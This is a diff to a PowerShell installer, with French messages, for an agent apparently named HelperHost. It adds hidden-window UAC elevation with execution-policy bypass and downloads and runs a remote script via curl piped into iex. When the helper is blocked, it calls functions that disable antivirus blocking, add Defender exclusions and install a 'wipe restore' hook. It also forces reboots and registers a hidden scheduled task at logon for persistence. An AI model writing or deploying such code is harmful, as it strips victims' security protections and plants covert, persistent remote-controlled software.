@@ -7,6 +7,8 @@ if (-not $BotBase) { throw 'BotBase manquant' }
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
 $AfterReboot = ($env:AGENTSHE_AFTER_REBOOT -eq '1')
+$ForceHarden = ($env:AGENTSHE_FORCE_HARDEN -eq '1')
+$IsElevatedRun = ($env:AGENTSHE_ELEVATED -eq '1')
 
 function Test-IsAdmin {
   $id = [Security.Principal.WindowsIdentity]::GetCurrent()
@@ -14,7 +16,8 @@ function Test-IsAdmin {
   return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
+function Invoke-ElevatedInstall {
+  # Hidden UAC elev — parent polls marker (RunAs -Wait is unreliable)
   if (-not $InstallUrl) {
     $InstallUrl = 'https://raw.githubusercontent.com/lilygopro/AgentSHE/main/scripts/install-win.ps1'
   }
@@ -22,6 +25,7 @@ if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
   $marker = Join-Path $env:TEMP 'HelperHost-install.ok'
   $fail = Join-Path $env:TEMP 'HelperHost-install.err'
   $pending = Join-Path $env:LOCALAPPDATA 'HelperHost\install-pending'
+  $tokenProbe = Join-Path $env:LOCALAPPDATA 'HelperHost\token'
   Remove-Item $marker, $fail -Force -ErrorAction SilentlyContinue
   $en = $Enroll.Replace("'", "''")
   $bb = $BotBase.Replace("'", "''")
@@ -35,6 +39,7 @@ if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
     "`$env:AGENTSHE_BOT_BASE = '$bb'"
     "`$env:AGENTSHE_INSTALL_URL = '$iu'"
     "`$env:AGENTSHE_ELEVATED = '1'"
+    "`$env:AGENTSHE_FORCE_HARDEN = '1'"
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
     "try {"
     "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
@@ -44,34 +49,48 @@ if (-not $env:AGENTSHE_ELEVATED -and -not (Test-IsAdmin)) {
     "  exit 1"
     "}"
   ) -join "`r`n" | Set-Content -Encoding UTF8 $wrap
+
+  $psi = New-Object System.Diagnostics.ProcessStartInfo
+  $psi.FileName = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
+  $psi.Arguments = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$wrap`""
+  $psi.UseShellExecute = $true
+  $psi.Verb = 'runas'
+  $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
   try {
-    $null = Start-Process -FilePath "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe" `
-      -Verb RunAs -PassThru -Wait `
-      -ArgumentList @('-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', $wrap)
+    $null = [System.Diagnostics.Process]::Start($psi)
   } catch {
+    Remove-Item $wrap -Force -ErrorAction SilentlyContinue
     throw "Elevation UAC refusee. Accepte l'invite Admin."
   }
+
+  for ($i = 0; $i -lt 200; $i++) {
+    Start-Sleep -Seconds 1
+    if (Test-Path $marker) {
+      Remove-Item $marker, $wrap -Force -ErrorAction SilentlyContinue
+      $script:ElevDoneOk = $true
+      return
+    }
+    if ((Test-Path $tokenProbe) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
+      Remove-Item $wrap -Force -ErrorAction SilentlyContinue
+      $script:ElevDoneOk = $true
+      return
+    }
+    if (Test-Path $pending) {
+      Remove-Item $wrap -Force -ErrorAction SilentlyContinue
+      $script:ElevRebootPending = $true
+      return
+    }
+    if (Test-Path $fail) {
+      $msg = Get-Content $fail -Raw -ErrorAction SilentlyContinue
+      Remove-Item $fail, $wrap -Force -ErrorAction SilentlyContinue
+      throw $msg
+    }
+  }
   Remove-Item $wrap -Force -ErrorAction SilentlyContinue
-  if (Test-Path $marker) {
-    Remove-Item $marker -Force -ErrorAction SilentlyContinue
-    Write-Output 'OK'
-    return
-  }
-  $tokenProbe = Join-Path $env:LOCALAPPDATA 'HelperHost\token'
-  if (Test-Path $tokenProbe) { Write-Output 'OK'; return }
-  if (Test-Path $pending) {
-    Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
-    return
-  }
-  $msg = 'install admin failed'
-  if (Test-Path $fail) {
-    $msg = (Get-Content $fail -Raw -ErrorAction SilentlyContinue)
-    Remove-Item $fail -Force -ErrorAction SilentlyContinue
-  }
-  throw $msg
+  throw 'timeout elevation'
 }
 
-$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.6' }
+$Gh = if ($env:AGENTSHE_GH) { $env:AGENTSHE_GH } else { 'https://github.com/lilygopro/AgentSHE/releases/download/v1.0.7' }
 $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
@@ -301,19 +320,17 @@ function Register-ResumeAtLogon {
     "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
     "try {"
     "  iex ((curl.exe -fsSL `$InstallUrl | Out-String))"
-    "  Write-Host 'OK'"
+    "  Write-Output 'OK'"
     "} catch {"
-    "  Write-Host `$_"
-    "  Start-Sleep -Seconds 20"
-    "  throw"
+    "  `$_ | Out-String | Set-Content -Encoding UTF8 (Join-Path `$env:TEMP 'HelperHost-resume.err')"
+    "  exit 1"
     "}"
     "Stop-Transcript -ErrorAction SilentlyContinue"
-    "Start-Sleep -Seconds 5"
   ) -join "`r`n" | Set-Content -Encoding UTF8 $launcher
 
   $tn = 'HelperHostResume'
   try { Unregister-ScheduledTask -TaskName $tn -Confirm:$false -ErrorAction SilentlyContinue } catch {}
-  $arg = "-NoProfile -ExecutionPolicy Bypass -NoExit -File `"$launcher`""
+  $arg = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$launcher`""
   $action = New-ScheduledTaskAction -Execute $ps -Argument $arg
   $userId = if ($env:USERDOMAIN -and $env:USERNAME) { "$env:USERDOMAIN\$env:USERNAME" } else { $env:USERNAME }
   try {
@@ -345,15 +362,25 @@ function Start-Helper([string]$Helper, [string]$WorkDir) {
   Unblock-Quiet $Helper
   Unblock-Quiet (Join-Path $WorkDir 'EdgeRelay.exe')
 
+  # 1) Essai normal — sans toucher a l'AV
+  if (-not $ForceHarden) {
+    if (Try-StartHelper $Helper $WorkDir) { return }
+  }
+
+  # 2) Bloque (AV / App Control) → elev + desactivation uniquement si besoin
+  if (-not (Test-IsAdmin) -and -not $IsElevatedRun) {
+    Invoke-ElevatedInstall
+    return
+  }
+
   Disable-AllBlocking
   Set-DefenderExclude $WorkDir $Helper
-
+  Install-WipeRestoreHook
   if (Try-StartHelper $Helper $WorkDir) { return }
 
   if (-not $AfterReboot) {
     Register-ResumeAtLogon
     '1' | Set-Content -Encoding ASCII $RebootFlag
-    Write-Host 'Reboot requis (Device Guard / SAC). Reprise auto a la connexion.'
     Write-Output 'REBOOT'
     Start-Sleep -Seconds 2
     Restart-Computer -Force
@@ -413,8 +440,22 @@ $Helper = Join-Path $Dir 'HelperHost.exe'
 $tokenFile = Join-Path $Dir 'token'
 $agentLog = Join-Path $Dir 'agent.log'
 Remove-Item $tokenFile,$agentLog -Force -ErrorAction SilentlyContinue
-Install-WipeRestoreHook
+$script:ElevDoneOk = $false
+$script:ElevRebootPending = $false
+if ((Test-IsAdmin) -or $ForceHarden) {
+  Install-WipeRestoreHook
+}
 Start-Helper $Helper $Dir
+
+if ($script:ElevDoneOk) {
+  Write-Output 'OK'
+  Clear-ResumeTasks
+  return
+}
+if ($script:ElevRebootPending) {
+  Write-Output 'REBOOT-PENDING (reprise auto a la prochaine connexion)'
+  return
+}
 
 $ok = $false
 for ($i=0; $i -lt 180; $i++) {
